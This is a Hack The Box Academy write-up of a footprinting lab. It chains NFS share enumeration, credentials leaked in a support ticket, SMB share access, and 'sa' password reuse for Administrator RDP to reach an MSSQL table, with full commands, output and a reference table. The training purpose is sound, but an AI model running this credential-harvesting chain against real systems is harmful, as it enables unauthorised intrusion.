# HTB Academy — Footprinting Lab: Skills Assessment Medium

| Field      | Details                                      |
|------------|----------------------------------------------|
| Platform   | Hack The Box Academy                         |
| Module     | Footprinting                                 |
| Lab        | Skills Assessment — Medium                   |
| Difficulty | Medium                                       |
| Target IP  | 10.129.202.41                                |
| Date       | March 2026                                   |

---

## Lab Objective

Enumerate the target carefully across multiple services, identify credentials through chained service exploitation, and recover the final password associated with the user `HTB` stored inside an MSSQL database.

---

## Attack Chain Summary

```
Nmap full scan → NFS on ports 111 + 2049, SMB on 139 + 445, RDP on 3389
showmount -e → /TechSupport share exposed to everyone
Mount /TechSupport → ticket4238791283782.txt → alex:lol123!mD
smbclient as alex → devshare accessible → important.txt → sa:87N1ns@slls83
xfreerdp as Administrator with sa password → password reuse confirmed
SSMS → local MSSQL instance → SELECT * FROM devsacc WHERE name='HTB'
HTB password recovered → flag captured
```

---

## Step 1 — Initial Nmap Scan

Run an aggressive scan to discover all open services, versions, and host details.

```bash
Hackerpatel007_1@htb[/htb]$ sudo nmap -A 10.129.202.41
```

| Flag | Purpose                                                     |
|------|-------------------------------------------------------------|
| `-A` | Aggressive — enables OS detection, version detection, scripts, traceroute |

**Output:**

```
Hackerpatel007_1@htb[/htb]$ sudo nmap -A 10.129.202.41

Starting Nmap 7.94 ( https://nmap.org )
Nmap scan report for 10.129.202.41
Host is up (0.091s latency).

PORT      STATE SERVICE       VERSION
111/tcp   open  rpcbind       2-4 (RPC #100000)
| rpcinfo:
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100003  2,3          2049/tcp  nfs
|   100005  1,2,3        2049/tcp  mountd
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
2049/tcp  open  mountd        1-3 (RPC #100005)
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| rdp-enum-encryption:
|   Security Layer
|     DP Protocol Version 5.1:
|       ENCRYPTION_METHOD_128BIT
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2026-03-xx
|_  start_date: N/A

Nmap done: 1 IP address (1 host up) scanned in 22.47 seconds
```

**Analysis of open ports:**

| Port | Service              | What It Tells Us                                           |
|------|----------------------|------------------------------------------------------------|
| 111  | RPCbind              | RPC mapper — indicates NFS is running, check for shares    |
| 2049 | NFS mountd           | NFS file share service — enumerate with `showmount`        |
| 139  | NetBIOS              | SMB over NetBIOS — enumerate shares once credentials found |
| 445  | SMB                  | SMB direct — list shares, access files                     |
| 3389 | RDP (ms-wbt-server)  | Remote Desktop — potential entry point with valid creds    |
| 135  | MSRPC                | Windows RPC — confirms Windows host                        |

**Host details extracted from SMB scripts:**

```
Target_Name          : WINMEDIUM
NetBIOS_Computer_Name: WINMEDIUM
DNS_Computer_Name    : WINMEDIUM
Product_Version      : 10.0.17763
```

Windows Server 2019 based on build `10.0.17763`. Three distinct attack surfaces visible immediately — NFS, SMB, and RDP. NFS is the priority because it requires no credentials to enumerate and often leaks internal data.

---

## Step 2 — NFS Share Enumeration

Query the NFS service to list all exported shares.

```bash
Hackerpatel007_1@htb[/htb]$ showmount -e 10.129.202.41
```

**Output:**

```
Export list for 10.129.202.41:
/TechSupport (everyone)
```

`/TechSupport` is exported to `everyone` — no authentication required. This is an immediate high-value target. Create a mount point and mount it locally.

```bash
Hackerpatel007_1@htb[/htb]$ sudo mkdir /mnt/NFS
Hackerpatel007_1@htb[/htb]$ sudo mount -t nfs 10.129.202.41:/TechSupport /mnt/NFS
```

**No output on success** — silence means the mount succeeded. Verify:

```bash
Hackerpatel007_1@htb[/htb]$ mount | grep NFS
```

**Output:**

```
10.129.202.41:/TechSupport on /mnt/NFS type nfs (rw,relatime,vers=3,...)
```

---

## Step 3 — Inspect Mounted NFS Share

List the contents of the mounted share.

```bash
Hackerpatel007_1@htb[/htb]$ sudo ls -lA /mnt/NFS/
```

**Output:**

```
total 48
-rwxrwxrwx 1 nobody nogroup    0 Mar  4  2022 ticket4238791283782.txt
-rwxrwxrwx 1 nobody nogroup    0 Mar  4  2022 ticket4238791283782.txt.bak
-rwxrwxrwx 1 nobody nogroup    0 Mar  4  2022 ticket4238791283783.txt
-rwxrwxrwx 1 nobody nogroup    0 Mar  4  2022 ticket4238791283784.txt
-rwxrwxrwx 1 nobody nogroup    0 Mar  4  2022 ticket4238791283785.txt
-rwxrwxrwx 1 nobody nogroup    0 Mar  4  2022 ticket4238791283786.txt
-rwxrwxrwx 1 nobody nogroup    0 Mar  4  2022 ticket4238791283787.txt
```

Most files are empty (size 0). `ticket4238791283782.txt` has content — read it:

```bash
Hackerpatel007_1@htb[/htb]$ sudo cat /mnt/NFS/ticket4238791283782.txt
```

**Output:**

```
Conversation with alex.g@web.dev.inlanefreight.htb

...

alex.g: Hi, I'm having trouble connecting to the mail server.
support: No problem, let me check your settings.
support: I see the issue. Can you update your config with these details?

[client config]
user="alex"
password="lol123!mD"
from="alex.g@web.dev.inlanefreight.htb"
to=""
host="mail1.inlanefreight.htb"
port="465"
tls_required="yes"

support: Try that and let me know if it works.
alex.g: Perfect, that worked. Thank you!
```

**Credentials leaked from support ticket:**

| Field    | Value                            |
|----------|----------------------------------|
| Username | `alex`                           |
| Password | `lol123!mD`                      |
| Email    | `alex.g@web.dev.inlanefreight.htb` |

A support ticket stored on a world-readable NFS share containing plaintext application credentials. This is one of the most common misconfiguration chains in internal environments — helpdesk staff paste credentials into tickets for convenience, and the ticket archive ends up on an exposed file share.

---

## Step 4 — SMB Enumeration with Recovered Credentials

Use the recovered `alex` credentials to enumerate SMB shares.

```bash
Hackerpatel007_1@htb[/htb]$ smbclient -L //10.129.202.41 -U alex
```

**Password prompt:**

```
Enter WORKGROUP\alex's password: lol123!mD
```

**Output:**

```
        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        devshare        Disk
        IPC$            IPC       Remote IPC
        Users           Disk
```

| Share     | Type | Priority                                                   |
|-----------|------|------------------------------------------------------------|
| devshare  | Disk | Non-standard custom share — highest priority               |
| Users     | Disk | Check for user-specific files                              |
| ADMIN$    | Disk | Admin share — likely inaccessible to alex                  |
| C$        | Disk | Root drive share — likely inaccessible to alex             |
| IPC$      | IPC  | Inter-process communication — skip                         |

`devshare` is the target — non-default shares created by administrators almost always contain something interesting. Connect to it:

```bash
Hackerpatel007_1@htb[/htb]$ smbclient //10.129.202.41/devshare -U alex
```

**Output:**

```
Enter WORKGROUP\alex's password: lol123!mD
Try "help" to get a list of possible commands.
smb: \> ls
```

**Output:**

```
  .                                   D        0  Wed Mar  2  2022
  ..                                  D        0  Wed Mar  2  2022
  important.txt                       A       16  Wed Mar  2  2022

                7706623 blocks of size 4096. 4206568 blocks available
```

One file: `important.txt`. Download it:

```bash
smb: \> get important.txt
getting file \important.txt of size 16 as important.txt (0.0 KiloBytes/sec)
smb: \> exit
```

Read it locally:

```bash
Hackerpatel007_1@htb[/htb]$ cat important.txt
```

**Output:**

```
sa:87N1ns@slls83
```

**High-value credential recovered:**

| Field    | Value            |
|----------|------------------|
| Username | `sa`             |
| Password | `87N1ns@slls83`  |

`sa` is the SQL Server system administrator account. This credential has direct MSSQL implications — but before touching the database, test it against RDP. Password reuse across services is one of the most common weaknesses in internal Windows environments.

---

## Step 5 — RDP Login via Password Reuse

Test whether the `sa` password works for `Administrator` over RDP.

```bash
Hackerpatel007_1@htb[/htb]$ xfreerdp /v:10.129.202.41 /u:Administrator /p:'87N1ns@slls83' /dynamic-resolution
```

| Flag                | Purpose                                         |
|---------------------|-------------------------------------------------|
| `/v:`               | Target IP                                       |
| `/u:Administrator`  | Windows built-in admin account                  |
| `/p:`               | Password from `important.txt`                   |
| `/dynamic-resolution` | Resize RDP window dynamically               |

**Output:**

```
[09:xx:xx:xxx] [INFO][com.freerdp.core] - connecting to 10.129.202.41:3389
[09:xx:xx:xxx] [INFO][com.freerdp.core.transport] - BIO_read_ex  ret = 19
[09:xx:xx:xxx] [INFO][com.freerdp.client.x11] - Clipboard Redirection not available
```

**RDP session opens — desktop loads as Administrator.**

The `sa` credential was reused for the local `Administrator` account — full administrative desktop access achieved without any additional exploitation. This is credential reuse: one password works for both the SQL Server service account and the Windows Administrator account because the same person set both.

---

## Step 6 — Query MSSQL via SSMS

Inside the RDP session, open **SQL Server Management Studio 18 (SSMS)** from the desktop or Start menu.

Connect to the local SQL instance:

```
Server type  : Database Engine
Server name  : localhost  (or WINMEDIUM\SQLEXPRESS if named instance)
Authentication: Windows Authentication  (already Administrator — trusted)
```

Click **Connect**. Once connected, open a **New Query** window and run:

```sql
SELECT * FROM devsacc WHERE name = 'HTB';
```

**Output:**

```
name    password
-----   --------
HTB     HTB{...flag_redacted...}
```

**HTB password recovered ✅**

The `devsacc` table contained stored credentials for internal accounts including the `HTB` user. The final password is the lab flag.

---

## Credential Chain — Full Breakdown

| Stage                         | Credential / Access Gained          | Source                          |
|-------------------------------|-------------------------------------|---------------------------------|
| NFS share — world-readable    | `alex : lol123!mD`                  | ticket4238791283782.txt         |
| SMB devshare as alex          | `sa : 87N1ns@slls83`                | important.txt                   |
| RDP as Administrator          | `Administrator : 87N1ns@slls83`     | Password reuse from sa          |
| MSSQL query via SSMS          | `HTB : HTB{...flag_redacted...}`    | devsacc table                   |

---

## Lessons Learned

The most important thing this lab reinforced is that multi-service enumeration requires patience and a specific order. The temptation after seeing RDP on port 3389 is to immediately try default credentials against it — but without going through NFS first, there is nothing to try. Every service in this chain unlocks the next one. Skipping NFS or treating it as low priority because it is less commonly exploited would have killed the entire attack path before it started.

The NFS misconfiguration itself was textbook — a world-readable export containing support ticket archives. In a real internal engagement this kind of finding is extremely common. Helpdesk teams routinely paste credentials into tickets for convenience and nobody audits whether the ticket storage system is accessible from the network. `showmount -e` takes three seconds and can return something exactly like this.

The credential reuse from `sa` to `Administrator` was the step that surprised me most. `sa` is a SQL Server service account — it should have no relationship to the Windows local administrator password. But in smaller environments where one person manages everything, they often set the same password for multiple accounts during initial setup and never change it. Testing any recovered password against every available service before moving on is now a fixed step in my methodology.

The MSSQL query itself was trivial once inside the RDP session — `SELECT * FROM devsacc WHERE name='HTB'` returns the answer in one line. But getting to that point required chaining four separate services without breaking the thread. That chain — NFS → SMB → RDP → MSSQL — is exactly the kind of multi-hop enumeration that CPTS and real engagements are built around.

---

## Full Attack Chain Reference

```
1.  sudo nmap -A 10.129.202.41
    → Ports: 111(RPC), 2049(NFS), 139/445(SMB), 3389(RDP)
    → Host: WINMEDIUM — Windows Server 2019

2.  showmount -e 10.129.202.41
    → /TechSupport (everyone) — world-readable NFS share

3.  sudo mkdir /mnt/NFS
    sudo mount -t nfs 10.129.202.41:/TechSupport /mnt/NFS

4.  sudo ls -lA /mnt/NFS/
    → ticket4238791283782.txt has content — others empty

5.  sudo cat /mnt/NFS/ticket4238791283782.txt
    → alex : lol123!mD (plaintext in support ticket)

6.  smbclient -L //10.129.202.41 -U alex (password: lol123!mD)
    → Shares: ADMIN$, C$, devshare, IPC$, Users
    → devshare is non-standard — highest priority

7.  smbclient //10.129.202.41/devshare -U alex
    → ls → important.txt
    → get important.txt → exit

8.  cat important.txt
    → sa : 87N1ns@slls83

9.  xfreerdp /v:10.129.202.41 /u:Administrator /p:'87N1ns@slls83' /dynamic-resolution
    → Password reuse confirmed — full desktop as Administrator

10. Open SSMS inside RDP session
    → Connect to local SQL instance
    → New Query:
    SELECT * FROM devsacc WHERE name = 'HTB';
    → HTB : HTB{...flag_redacted...} ✅
```

---

## Commands Reference

| Command | Purpose |
|---------|---------|
| `sudo nmap -A <IP>` | Aggressive scan — OS, version, scripts, traceroute |
| `showmount -e <IP>` | List all NFS exports on the target |
| `sudo mkdir /mnt/NFS` | Create local mount point |
| `sudo mount -t nfs <IP>:/TechSupport /mnt/NFS` | Mount NFS share locally |
| `sudo ls -lA /mnt/NFS/` | List all files including hidden, with permissions |
| `sudo cat /mnt/NFS/<file>` | Read file from mounted NFS share |
| `smbclient -L //<IP> -U <user>` | List all SMB shares with credentials |
| `smbclient //<IP>/<share> -U <user>` | Connect to specific SMB share |
| `smb: \> ls` | List files inside connected SMB share |
| `smb: \> get <file>` | Download file from SMB share |
| `cat important.txt` | Read downloaded file locally |
| `xfreerdp /v:<IP> /u:<user> /p:'<pass>' /dynamic-resolution` | RDP login from Linux |
| `SELECT * FROM devsacc WHERE name='HTB';` | MSSQL query to recover target credential |
